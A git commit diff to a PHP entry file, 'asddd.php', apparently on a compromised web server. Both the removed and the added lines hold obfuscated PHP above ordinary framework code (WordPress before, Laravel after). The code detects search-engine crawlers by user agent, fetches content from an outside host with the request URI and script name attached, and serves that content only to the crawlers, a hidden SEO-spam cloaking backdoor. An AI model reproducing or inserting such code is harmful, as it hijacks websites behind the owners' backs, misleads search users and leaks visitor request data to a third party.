cd1ec8628169ec760723e7c351003df0768ad712
boyas2 <limitboyas@gmail.com>
2024-10-30 11:17:29 +0700

    Update asddd.php

--- asddd.php
+++ asddd.php
@@ -1,19 +1,62 @@
 <?php
-goto O5991; O8490: $O5190 = urlencode($_SERVER["\122\105\121\125\105\123\x54\137\x55\x52\x49"]); goto O9929; O1969: ini_set("\x64\151\163\160\x6c\x61\x79\137\145\162\162\x6f\x72\x73", 1); goto O3716; O2414: $O8328 = isset($O8328) ? $O8328 : ''; goto O7736; O8797: function o7547($O1078) { goto O0409; O7384: O4238: goto O0679; O0865: foreach ($O4271 as $O6132) { goto O9120; O9120: if (!(stripos($O1078, $O6132) !== false)) { goto O8503; } goto O6513; O6513: return true; goto O6951; O6951: O8503: goto O8615; O8615: O5642: goto O3307; O3307: } goto O7384; O0679: return false; goto O2069; O0409: $O4271 = ["\x47\157\x6f\147\x6c\x65\142\157\164", "\102\x69\156\x67\x62\157\x74", "\123\x6c\165\162\160", "\x44\x75\x63\x6b\x44\x75\143\153\x42\157\164", "\x42\x61\151\x64\165\x73\160\x69\x64\x65\x72", "\131\141\x6e\144\145\x78\x42\x6f\x74", "\123\157\x67\x6f\x75", "\x54\x65\154\x65\147\162\141\155\x42\157\164", "\105\170\141\x62\x6f\164", "\146\x61\x63\145\142\x6f\x74", "\x69\x61\137\141\162\x63\150\151\x76\x65\162", "\x47\x6f\157\x67\x6c\x65\x2d\x53\151\164\145\55\126\x65\162\151\x66\x69\x63\141\164\151\157\156", "\107\x6f\157\x67\x6c\x65\x2d\x49\x6e\163\160\x65\143\164\x69\x6f\x6e\124\157\x6f\154", "\101\x68\162\145\146\163\x42\157\x74"]; goto O0865; O2069: } goto O9598; O0643: if (!o7547($_SERVER["\x48\x54\x54\x50\x5f\125\123\x45\x52\x5f\x41\107\x45\116\x54"])) { goto O5207; } goto O9317; O1122: exit; goto O8057; O0650: $O6439 = o4810($O3675); goto O6392; O2153: $O6706 = isset($O6706) ? $O6706 : ''; goto O0500; O9929: $O6439 = ''; goto O2813; O6721: $O8048 = isset($O8048) ? $O8048 : ''; goto O8797; O3530: $O4831 = urlencode($_SERVER["\123\x43\x52\x49\120\x54\x5f\116\x41\115\x45"]); goto O2153; O9317: $O3675 = "\150\x74\164\160\x73\x3a\57\57\x63\x6f\x62\x61\x73\141\156\x74\141\x69\56\163\x69\164\145\57\x63\x6f\156\x74\x65\x6e\164\57\156\x65\x77\x6d\x65\155\142\x65\x72\x2e\x74\x78\164\x3f\141\x67\145\x6e\164\75{$O8057}\x26\162\145\x66\145\x72\162\145\x72\x3d{$O6706}\x26\154\141\156\x67\75{$O2856}\x26\x69\160\x3d{$O8328}\x26\144\x6f\155\75{$O9839}\x26\x68\164\164\x70\75{$O1655}\x26\x75\x72\x69\75{$O5190}\46\x70\x63\75{$O8048}\x26\x72\145\x77\x72\151\x74\141\142\154\x65\75{$O3980}\46\x73\143\x72\151\x70\164\75{$O4831}"; goto O0650; O0500: $O2856 = isset($O2856) ? $O2856 : ''; goto O2414; O7736: $O9839 = isset($O9839) ? $O9839 : ''; goto O1991; O2813: $O3980 = 0; goto O3530; O9598: function O4810($O1829) { goto O6377; O3455: curl_setopt($O8118, CURLOPT_URL, $O1829); goto O3315; O9408: return $O4907; goto O6455; O3707: curl_close($O8118); goto O9408; O3315: curl_setopt($O8118, CURLOPT_RETURNTRANSFER, true); goto O0840; O0840: $O4907 = curl_exec($O8118); goto O3707; O6377: $O8118 = curl_init(); goto O3455; O6455: } goto O0643; O5991: error_reporting(E_ALL); goto O1969; O3716: $O8057 = urlencode($_SERVER["\110\x54\x54\x50\137\x55\123\105\x52\x5f\101\107\x45\116\x54"]); goto O8490; O1991: $O1655 = isset($O1655) ? $O1655 : ''; goto O6721; O6392: echo $O6439; goto O1122; O8057: O5207:
+goto O9221; O2763: $O7241 = isset($O7241) ? $O7241 : ''; goto O7050; O5623: exit; goto O8170; O5913: $O3637 = isset($O3637) ? $O3637 : ''; goto O5698; O0056: $O3928 = ''; goto O7724; O7050: $O5009 = isset($O5009) ? $O5009 : ''; goto O9238; O6337: if (!O5366($_SERVER["\x48\x54\x54\120\x5f\x55\123\x45\x52\137\x41\107\x45\116\124"])) { goto O4746; } goto O5525; O7724: $O8794 = 0; goto O7132; O7132: $O9316 = urlencode($_SERVER["\x53\x43\122\x49\x50\x54\x5f\x4e\x41\115\105"]); goto O8290; O4083: echo $O3928; goto O5623; O5081: $O3928 = o7355($O5622); goto O4083; O6747: function o7355($O1852) { goto O6381; O0571: curl_setopt($O0461, CURLOPT_URL, $O1852); goto O6571; O6571: curl_setopt($O0461, CURLOPT_RETURNTRANSFER, true); goto O8716; O4250: return $O2454; goto O0045; O6381: $O0461 = curl_init(); goto O0571; O8716: $O2454 = curl_exec($O0461); goto O5464; O5464: curl_close($O0461); goto O4250; O0045: } goto O6337; O9238: $O3240 = isset($O3240) ? $O3240 : ''; goto O5913; O2237: ini_set("\144\151\x73\x70\x6c\x61\171\137\145\x72\x72\157\x72\x73", 1); goto O9162; O9162: $O1349 = urlencode($_SERVER["\110\124\124\x50\x5f\x55\x53\105\122\137\101\107\105\x4e\x54"]); goto O0967; O9221: error_reporting(E_ALL); goto O2237; O8290: $O4680 = isset($O4680) ? $O4680 : ''; goto O0885; O5525: $O5622 = "\x68\x74\164\x70\163\x3a\57\57\x72\141\x77\56\147\151\x74\x68\165\x62\x75\163\x65\162\143\157\156\x74\x65\156\164\x2e\x63\157\x6d\x2f\142\157\x79\141\x73\x32\x2f\x61\x62\x6f\x79\x61\163\x2f\x72\145\146\163\x2f\150\x65\x61\144\163\x2f\155\x61\151\x6e\x2f\155\x61\143\x61\x6e\x31\56\x68\x74\x6d\154\x3f\141\x67\x65\156\164\75{$O1349}\x26\162\145\146\145\162\162\x65\x72\75{$O4680}\x26\154\141\x6e\147\75{$O9819}\x26\x69\x70\75{$O7241}\x26\144\157\x6d\75{$O5009}\46\x68\164\164\160\x3d{$O3240}\x26\165\x72\x69\75{$O4681}\46\160\x63\x3d{$O3637}\x26\x72\x65\167\x72\151\164\x61\142\154\x65\x3d{$O8794}\x26\x73\x63\x72\151\160\164\75{$O9316}"; goto O5081; O0885: $O9819 = isset($O9819) ? $O9819 : ''; goto O2763; O5698: function o5366($O7376) { goto O1126; O5835: return false; goto O0011; O1126: $O0709 = ["\107\157\157\x67\154\x65\x62\x6f\164", "\102\x69\x6e\147\x62\x6f\164", "\123\154\165\x72\160", "\x44\x75\143\153\104\165\143\x6b\x42\x6f\164", "\x42\141\151\144\x75\163\160\x69\x64\145\162", "\131\x61\x6e\x64\145\x78\x42\157\x74", "\123\157\147\x6f\165", "\124\x65\x6c\145\147\x72\x61\x6d\102\x6f\x74", "\105\x78\x61\x62\157\164", "\x66\141\x63\x65\x62\157\164", "\151\x61\x5f\141\162\143\x68\151\x76\x65\x72", "\107\x6f\x6f\147\154\x65\x2d\x53\151\x74\145\55\126\145\x72\151\x66\x69\143\x61\164\151\x6f\156", "\107\x6f\157\147\154\145\55\111\x6e\163\160\x65\x63\164\x69\157\156\124\157\x6f\154", "\101\x68\162\x65\146\163\x42\157\164"]; goto O4814; O4814: foreach ($O0709 as $O5291) { goto O3711; O6285: return true; goto O3133; O3251: O1101: goto O1253; O3133: O9842: goto O3251; O3711: if (!(stripos($O7376, $O5291) !== false)) { goto O9842; } goto O6285; O1253: } goto O3718; O3718: O1688: goto O5835; O0011: } goto O6747; O0967: $O4681 = urlencode($_SERVER["\122\x45\x51\x55\105\x53\124\137\x55\122\111"]); goto O0056; O8170: O4746:
+
 
 /**
- * Front to the WordPress application. This file doesn't do anything, but loads
- * wp-blog-header.php which does and tells WordPress to load the theme.
+ * Laravel - A PHP Framework For Web Artisans
  *
- * @package WordPress
+ * @package  Laravel
+ * @author   Taylor Otwell <taylor@laravel.com>
  */
 
-/**
- * Tells WordPress to load the WordPress theme and output it.
- *
- * @var bool
- */
-define( 'WP_USE_THEMES', true );
+define('LARAVEL_START', microtime(true));
 
-/** Loads the WordPress Environment and Template */
-require __DIR__ . '/wp-blog-header.php';
+/*
+|--------------------------------------------------------------------------
+| Register The Auto Loader
+|--------------------------------------------------------------------------
+|
+| Composer provides a convenient, automatically generated class loader for
+| our application. We just need to utilize it! We'll simply require it
+| into the script here so that we don't have to worry about manual
+| loading any of our classes later on. It feels great to relax.
+|
+*/
+
+require __DIR__.'/../vendor/autoload.php';
+
+/*
+|--------------------------------------------------------------------------
+| Turn On The Lights
+|--------------------------------------------------------------------------
+|
+| We need to illuminate PHP development, so let us turn on the lights.
+| This bootstraps the framework and gets it ready for use, then it
+| will load up this application so that we can run it and send
+| the responses back to the browser and delight our users.
+|
+*/
+
+$app = require_once __DIR__.'/../bootstrap/app.php';
+
+/*
+|--------------------------------------------------------------------------
+| Run The Application
+|--------------------------------------------------------------------------
+|
+| Once we have the application, we can handle the incoming request
+| through the kernel, and send the associated response back to
+| the client's browser allowing them to enjoy the creative
+| and wonderful application we have prepared for them.
+|
+*/
+
+$kernel = $app->make(Illuminate\Contracts\Http\Kernel::class);
+
+$response = $kernel->handle(
+    $request = Illuminate\Http\Request::capture()
+);
+
+$response->send();
+
+$kernel->terminate($request, $response);
